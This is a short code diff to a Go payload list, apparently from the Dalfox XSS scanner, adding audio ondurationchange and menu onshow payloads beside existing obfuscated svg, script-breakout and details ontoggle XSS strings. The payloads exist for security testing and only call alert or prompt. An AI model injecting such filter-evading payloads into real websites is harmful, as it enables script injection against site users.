@@ -52,6 +52,8 @@ func getCommonPayload() []string {
 		"'\"><svg/class=dalfox onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f",
 		"</script><svg><script/class=dalfox>alert(45)</script>-%26apos;",
 		"<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() class=dalfox>",
+		"<audio controls ondurationchange=alert(45) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>",
+		"<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=alert(45)></menu></div>",
 
 		// not include verify payload
 		"\"><svg/OnLoad=\"`${prompt``}`\">",
